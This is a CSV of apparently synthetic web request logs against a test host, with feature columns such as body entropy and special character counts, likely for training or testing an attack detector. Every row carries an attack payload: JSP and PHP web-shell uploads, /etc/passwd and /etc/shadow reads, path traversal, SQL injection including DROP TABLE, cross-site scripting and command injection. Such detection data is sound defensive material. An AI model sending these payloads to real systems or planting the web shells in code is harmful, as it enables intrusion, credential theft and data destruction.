timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T10:21:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.33,22,1,85,1,200,739
2025-01-01T10:22:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.08,2,1,11,0,302,765
2025-01-01T10:23:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.97,6,1,21,0,403,1358
2025-01-01T10:24:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.35,6,1,21,0,403,220
2025-01-01T10:25:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.72,3,1,18,0,200,1502
2025-01-01T10:26:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.57,6,1,21,0,403,1052
2025-01-01T10:27:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.85,3,1,15,0,403,1031
2025-01-01T10:28:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.81,10,1,27,0,302,716
2025-01-01T10:29:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.94,3,1,15,0,200,214
2025-01-01T10:30:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.24,7,1,25,0,403,809
2025-01-01T10:31:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.02,7,1,25,0,200,725
2025-01-01T10:32:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.58,22,1,85,1,302,408
2025-01-01T10:33:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.85,10,1,27,0,403,574
2025-01-01T10:34:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.59,8,1,28,0,500,306
2025-01-01T10:35:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.05,3,1,15,0,500,645
2025-01-01T10:36:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.2,0,1,6,0,500,1381
2025-01-01T10:37:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.53,22,1,85,1,500,1533
2025-01-01T10:38:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.22,13,1,22,0,302,1416
2025-01-01T10:39:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.54,10,1,27,0,302,1554
2025-01-01T10:40:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.62,6,1,21,0,403,786
2025-01-01T10:41:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.07,1,1,3,0,302,908
2025-01-01T10:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.1,22,1,85,1,500,396
2025-01-01T10:43:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.55,7,1,25,0,302,288
2025-01-01T10:44:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.4,7,1,33,0,200,1414
2025-01-01T10:45:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.06,3,1,18,0,500,1075
2025-01-01T10:46:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.53,3,1,8,0,200,1324
2025-01-01T10:47:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.53,22,1,85,1,500,1190
2025-01-01T10:48:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.9,19,1,55,1,500,274
2025-01-01T10:49:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.78,2,1,11,0,302,522
2025-01-01T10:50:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,6.22,6,1,21,0,500,532
2025-01-01T10:51:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.14,7,1,25,0,403,936
2025-01-01T10:52:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.23,7,1,25,0,302,1210
2025-01-01T10:53:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.07,22,1,85,1,200,1194
2025-01-01T10:54:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.41,3,1,15,0,200,1430
2025-01-01T10:55:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.76,7,1,33,0,200,236
2025-01-01T10:56:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.06,6,1,21,0,500,1413
2025-01-01T10:57:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.18,7,1,33,0,302,706
2025-01-01T10:58:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.18,3,1,8,0,500,1432
2025-01-01T10:59:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.21,10,1,27,0,302,643
2025-01-01T11:00:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.35,10,1,27,0,403,1502
2025-01-01T11:01:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.86,3,1,8,0,403,996
2025-01-01T11:02:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.64,0,1,2,0,200,873
2025-01-01T11:03:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.93,1,1,3,0,500,801
2025-01-01T11:04:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.92,6,1,21,0,200,421
2025-01-01T11:05:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.7,2,1,11,0,200,927
2025-01-01T11:06:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.83,1,1,3,0,403,765
2025-01-01T11:07:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.87,13,1,22,0,200,1518
2025-01-01T11:08:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.96,7,1,11,0,500,785
2025-01-01T11:09:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.31,1,1,3,0,302,911
2025-01-01T11:10:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.91,22,1,85,1,200,1173
2025-01-01T11:11:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.21,0,1,2,0,500,985
2025-01-01T11:12:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.81,13,1,22,0,200,461
2025-01-01T11:13:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.27,3,1,15,0,200,681
2025-01-01T11:14:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.91,19,1,55,1,403,509
2025-01-01T11:15:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.94,3,1,18,0,200,499
2025-01-01T11:16:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.6,6,1,22,0,403,1583
2025-01-01T11:17:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.73,19,1,55,1,302,665
2025-01-01T11:18:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.71,3,1,8,0,500,246
2025-01-01T11:19:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.57,7,1,11,0,403,846
2025-01-01T11:20:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.77,1,1,3,0,200,1008
2025-01-01T11:21:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.28,7,1,25,0,403,527
2025-01-01T11:22:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.17,6,1,22,0,200,1075
2025-01-01T11:23:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.94,3,1,8,0,500,777
2025-01-01T11:24:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.11,13,1,22,0,403,1479
2025-01-01T11:25:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.82,2,1,11,0,200,925
2025-01-01T11:26:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.42,7,1,33,0,403,1535
2025-01-01T11:27:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.53,6,1,21,0,200,875
2025-01-01T11:28:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.32,7,1,11,0,302,220
2025-01-01T11:29:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.62,22,1,85,1,500,1471
2025-01-01T11:30:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.4,19,1,55,1,302,862
2025-01-01T11:31:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.91,3,1,8,0,500,622
2025-01-01T11:32:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.06,2,1,11,0,500,515
2025-01-01T11:33:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.31,10,1,27,0,302,685
2025-01-01T11:34:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.37,0,1,6,0,302,962
2025-01-01T11:35:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.67,3,1,18,0,302,1044
2025-01-01T11:36:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.04,10,1,27,0,200,757
2025-01-01T11:37:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.54,7,1,33,0,302,909
2025-01-01T11:38:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.57,6,1,22,0,200,692
2025-01-01T11:39:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.78,13,1,22,0,500,814
2025-01-01T11:40:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.99,1,1,3,0,200,313
2025-01-01T11:41:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.8,7,1,33,0,500,362
2025-01-01T11:42:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.19,2,1,11,0,302,887
2025-01-01T11:43:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.69,7,1,33,0,200,892
2025-01-01T11:44:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.98,2,1,11,0,302,567
2025-01-01T11:45:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.61,0,1,2,0,500,963
2025-01-01T11:46:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.81,8,1,28,0,500,1031
2025-01-01T11:47:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.05,22,1,85,1,403,1253
2025-01-01T11:48:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.99,6,1,22,0,200,898
2025-01-01T11:49:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.15,1,1,3,0,403,321
2025-01-01T11:50:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.6,6,1,21,0,302,1412
2025-01-01T11:51:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.13,7,1,11,0,500,827
2025-01-01T11:52:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.72,6,1,21,0,500,1530
2025-01-01T11:53:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.63,13,1,22,0,500,226
2025-01-01T11:54:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.28,19,1,55,1,302,679
2025-01-01T11:55:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.14,6,1,21,0,403,1510
2025-01-01T11:56:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.8,3,1,8,0,302,1295
2025-01-01T11:57:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.1,22,1,85,1,302,334
2025-01-01T11:58:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.85,19,1,55,1,200,307
2025-01-01T11:59:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.43,1,1,3,0,200,629
2025-01-01T12:00:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.2,7,1,33,0,302,399
2025-01-01T12:01:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.75,19,1,55,1,403,1276
2025-01-01T12:02:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.48,19,1,55,1,500,565
2025-01-01T12:03:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.6,8,1,28,0,302,1562
2025-01-01T12:04:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.87,6,1,22,0,302,524
2025-01-01T12:05:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.39,7,1,33,0,500,676
2025-01-01T12:06:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.85,7,1,25,0,403,376
2025-01-01T12:07:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.14,19,1,55,1,302,575
2025-01-01T12:08:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.54,3,1,8,0,403,1508
2025-01-01T12:09:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.62,22,1,85,1,302,1074
2025-01-01T12:10:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.63,13,1,22,0,500,1488
2025-01-01T12:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.44,19,1,55,1,302,298
2025-01-01T12:12:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.69,22,1,85,1,200,750
2025-01-01T12:13:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.57,3,1,8,0,302,757
2025-01-01T12:14:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.64,6,1,22,0,200,517
2025-01-01T12:15:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.59,10,1,27,0,200,836
2025-01-01T12:16:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.52,6,1,21,0,403,1327
2025-01-01T12:17:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.37,3,1,15,0,403,1440
2025-01-01T12:18:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.47,0,1,2,0,302,511
2025-01-01T12:19:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.9,7,1,11,0,500,1000
2025-01-01T12:20:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.71,10,1,27,0,403,1495
2025-01-01T12:21:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.27,6,1,22,0,302,942
2025-01-01T12:22:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.71,19,1,55,1,302,825
2025-01-01T12:23:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.24,22,1,85,1,200,565
2025-01-01T12:24:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.84,1,1,3,0,403,361
2025-01-01T12:25:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.3,7,1,33,0,500,521
2025-01-01T12:26:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.69,6,1,22,0,403,421
2025-01-01T12:27:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.61,10,1,27,0,500,1359
2025-01-01T12:28:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.44,3,1,15,0,302,962
2025-01-01T12:29:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.81,6,1,22,0,403,1293
2025-01-01T12:30:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.94,7,1,11,0,302,758
2025-01-01T12:31:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.58,10,1,27,0,200,1400
2025-01-01T12:32:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.17,19,1,55,1,302,322
2025-01-01T12:33:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.6,22,1,85,1,500,900
2025-01-01T12:34:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.47,13,1,22,0,500,1042
2025-01-01T12:35:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.56,19,1,55,1,200,1589
2025-01-01T12:36:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.7,7,1,25,0,500,1040
2025-01-01T12:37:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.73,7,1,19,0,403,1056
2025-01-01T12:38:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.56,22,1,85,1,302,1178
2025-01-01T12:39:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.53,0,1,6,0,200,1247
2025-01-01T12:40:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.04,7,1,33,0,302,401
2025-01-01T12:41:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.86,19,1,55,1,200,874
